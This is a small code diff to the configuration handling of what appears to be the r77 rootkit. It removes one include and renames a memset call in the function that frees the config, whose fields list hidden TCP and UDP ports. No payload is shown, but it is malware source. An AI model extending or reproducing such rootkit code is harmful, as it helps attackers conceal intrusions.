@@ -1,6 +1,5 @@
 #include "r77config.h"
 #include "r77def.h"
-#include "r77runtime.h"
 #include <sddl.h>
 
 PR77_CONFIG LoadR77Config()
@@ -98,7 +97,7 @@ VOID DeleteR77Config(PR77_CONFIG config)
 	DeleteIntegerList(config->HiddenTcpLocalPorts);
 	DeleteIntegerList(config->HiddenTcpRemotePorts);
 	DeleteIntegerList(config->HiddenUdpPorts);
-	libc_memset(config, 0, sizeof(R77_CONFIG));
+	i_memset(config, 0, sizeof(R77_CONFIG));
 	FREE(config);
 }
 BOOL CompareR77Config(PR77_CONFIG configA, PR77_CONFIG configB)
